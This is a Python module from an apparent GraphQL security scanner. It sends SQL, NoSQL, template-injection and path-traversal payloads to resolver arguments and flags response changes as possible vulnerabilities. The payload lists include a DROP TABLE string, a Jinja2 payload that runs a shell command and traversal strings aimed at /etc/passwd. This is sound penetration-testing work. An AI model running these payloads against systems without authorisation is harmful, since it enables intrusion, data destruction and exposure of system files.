"""
probe/injection.py
Module 4: Injection Vulnerability Tester

Tests GraphQL resolver arguments for injection vulnerabilities:
  1. SQL Injection  — classic, time-based, UNION
  2. NoSQL Injection — MongoDB operator injection
  3. SSTI            — Server-Side Template Injection via args
  4. Path Traversal  — directory traversal in file-related fields

For each test:
  - Sends a baseline (clean) request
  - Sends the injected payload
  - Compares response size, content, and timing
  - Flags differences as potential injection points
"""

import requests
import time
import json
from typing import List, Dict

# ── Payload Libraries ─────────────────────────────────────────────────────────

SQL_PAYLOADS = [
    ("SQLi_always_true",   "' OR '1'='1"),
    ("SQLi_comment_bypass","' OR 1=1 --"),
    ("SQLi_union_probe",   "' UNION SELECT 1,2,3 --"),
    ("SQLi_sleep_mysql",   "' OR SLEEP(3) --"),
    ("SQLi_sleep_postgres","' OR pg_sleep(3) --"),
    ("SQLi_drop_probe",    "'; DROP TABLE users; --"),
    ("SQLi_stacked",       "1'; SELECT 1 --"),
]

NOSQL_PAYLOADS = [
    ("NoSQLi_gt_operator",  '{"$gt": ""}'),
    ("NoSQLi_ne_operator",  '{"$ne": null}'),
    ("NoSQLi_where_clause", '{"$where": "sleep(3000)"}'),
    ("NoSQLi_regex",        '{"$regex": ".*"}'),
]

SSTI_PAYLOADS = [
    ("SSTI_jinja2",        "{{7*7}}"),
    ("SSTI_jinja2_exec",   "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
    ("SSTI_mako",          "${7*7}"),
]

PATH_TRAVERSAL_PAYLOADS = [
    ("PathTraversal_unix",  "../../../../etc/passwd"),
    ("PathTraversal_win",   "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"),
]


# ── Core Test Runner ──────────────────────────────────────────────────────────

def test_injection_on_field(
    target_url: str,
    query_name: str,
    arg_name: str,
    baseline_value: str,
    payloads: List[tuple],
    timeout: int = 10,
    token: str = None,
) -> List[Dict]:
    """
    For a given resolver (query_name) and argument (arg_name):
      1. Run baseline request with clean value
      2. Run each payload
      3. Compare responses
    """
    print(f"\n[INJECTION] Testing {query_name}(${arg_name}) for injection...")
    findings = []
    
    # Build baseline query
    baseline_query = _build_query(query_name, arg_name, baseline_value)
    
    # Send baseline
    baseline_response, baseline_time = _send_query(target_url, baseline_query, timeout, token=token)
    if baseline_response is None:
        print(f"[INJECTION]   ✗ Baseline request failed — skipping field")
        return findings
    
    baseline_size = len(json.dumps(baseline_response))
    print(f"[INJECTION]   Baseline response: {baseline_size} bytes in {baseline_time:.2f}s")
    
    # Test each payload
    for payload_name, payload_value in payloads:
        injected_query = _build_query(query_name, arg_name, payload_value)
        injected_response, injected_time = _send_query(target_url, injected_query, timeout, token=token)
        
        if injected_response is None:
            continue
        
        injected_size = len(json.dumps(injected_response))
        size_delta = abs(injected_size - baseline_size)
        time_delta = injected_time - baseline_time
        
        # Heuristics for injection detection
        indicators = []
        
        if size_delta > 100:
            indicators.append(f"response size changed by {size_delta} bytes")
        if time_delta > 2.0:
            indicators.append(f"response time increased by {time_delta:.1f}s (time-based injection?)")
        if "errors" not in injected_response and "errors" in baseline_response:
            indicators.append("baseline had errors but injected succeeded — authentication bypass?")
        
        # Check for data leakage (more data returned with injection)
        if "data" in injected_response and "data" in baseline_response:
            inj_data = injected_response["data"]
            base_data = baseline_response["data"]
            if injected_size > baseline_size * 1.5:
                indicators.append(f"response significantly larger — possible data dump")
        
        # Check if error messages leak DB info
        if "errors" in injected_response:
            for err in injected_response.get("errors", []):
                msg = err.get("message", "").lower()
                for db_leak in ["syntax error", "mysql", "postgresql", "sqlite", "ora-", "microsoft"]:
                    if db_leak in msg:
                        indicators.append(f"DB error leaked in response: '{err['message'][:100]}'")
        
        is_vulnerable = len(indicators) > 0
        
        finding = {
            "query": query_name,
            "argument": arg_name,
            "payload_name": payload_name,
            "payload_value": payload_value,
            "baseline_size": baseline_size,
            "injected_size": injected_size,
            "size_delta": size_delta,
            "time_delta": round(time_delta, 3),
            "indicators": indicators,
            "vulnerable": is_vulnerable,
            "injected_query": injected_query,
        }
        
        findings.append(finding)
        
        status = "✗ POTENTIALLY VULNERABLE" if is_vulnerable else "✓ No reaction"
        print(f"[INJECTION]   [{payload_name}] {status}")
        for ind in indicators:
            print(f"[INJECTION]     → {ind}")
    
    return findings


def _build_query(query_name: str, arg_name: str, arg_value: str) -> str:
    """Build a GraphQL query with the given argument value."""
    # Escape inner quotes for GraphQL string
    escaped = arg_value.replace('\\', '\\\\').replace('"', '\\"')
    return (
        f'query InjectionTest {{\n'
        f'  {query_name}({arg_name}: "{escaped}") {{\n'
        f'    ... on SearchResult {{ count users {{ id username email }} }}\n'
        f'    ... on User {{ id username email }}\n'
        f'  }}\n'
        f'}}'
    )


def _send_query(target_url: str, query: str, timeout: int, token: str = None) -> tuple:
    """Send a query and return (response_json, elapsed_time). Returns (None, 0) on error."""
    try:
        start = time.time()
        headers = {"Content-Type": "application/json"}
        if token:
            headers["Authorization"] = f"Bearer {token}"
        
        response = requests.post(
            target_url,
            json={"query": query},
            headers=headers,
            timeout=timeout,
        )
        elapsed = time.time() - start
        return response.json(), elapsed
    except Exception as e:
        return None, 0


def run_all_injection_tests(target_url: str, parsed_schema: dict, token: str = None) -> List[Dict]:
    """
    Automatically find string-argument fields in the schema and test them all.
    Falls back to known vulnerable fields if schema is unavailable.
    """
    all_findings = []
    
    # Find query fields with string arguments from schema
    string_arg_fields = []
    for field in parsed_schema.get("query_fields", []):
        for arg in field.get("args", []):
            arg_type = arg.get("type", "").replace("!", "").replace("[", "").replace("]", "")
            if arg_type in ("String",):
                string_arg_fields.append((field["name"], arg["name"]))
    
    if not string_arg_fields:
        # Fallback: test known field from our target
        string_arg_fields = [("search_users", "query")]
        print("[INJECTION] No string-arg fields found in schema — using fallback targets")
    
    print(f"\n[INJECTION] Found {len(string_arg_fields)} injectable field(s) to test:")
    for qname, aname in string_arg_fields:
        print(f"  • {qname}(${aname}: String)")
    
    for query_name, arg_name in string_arg_fields:
        # SQL Injection tests
        sqli_findings = test_injection_on_field(
            target_url, query_name, arg_name,
            baseline_value="alice",
            payloads=SQL_PAYLOADS,
            token=token,
        )
        all_findings.extend(sqli_findings)
        
        # NoSQL Injection tests
        nosql_findings = test_injection_on_field(
            target_url, query_name, arg_name,
            baseline_value="alice",
            payloads=NOSQL_PAYLOADS,
            token=token,
        )
        all_findings.extend(nosql_findings)
    
    return all_findings


def print_injection_results(findings: List[Dict]):
    """Pretty-print injection findings."""
    print("\n" + "="*60)
    print("  INJECTION VULNERABILITY RESULTS")
    print("="*60)
    
    vulnerable = [f for f in findings if f["vulnerable"]]
    safe = [f for f in findings if not f["vulnerable"]]
    
    print(f"\n  Summary: {len(vulnerable)} potentially vulnerable | {len(safe)} no reaction\n")
    
    if vulnerable:
        print("  🔴 POTENTIALLY VULNERABLE PAYLOADS:")
        for f in vulnerable:
            print(f"\n  Field    : {f['query']}(${f['argument']})")
            print(f"  Payload  : [{f['payload_name']}] {f['payload_value']!r}")
            print(f"  Evidence :")
            for ind in f["indicators"]:
                print(f"    → {ind}")
            print(f"  Sample query to reproduce:")
            for line in f["injected_query"].split("\n"):
                print(f"    {line}")
    else:
        print("  🟢 No injection reactions detected.")
    
    print("\n" + "="*60)


if __name__ == "__main__":
    TARGET = "http://localhost:4000/graphql"
    mock_schema = {
        "query_fields": [
            {"name": "search_users", "type": "SearchResult",
             "args": [{"name": "query", "type": "String!"}]}
        ]
    }
    findings = run_all_injection_tests(TARGET, mock_schema)
    print_injection_results(findings)
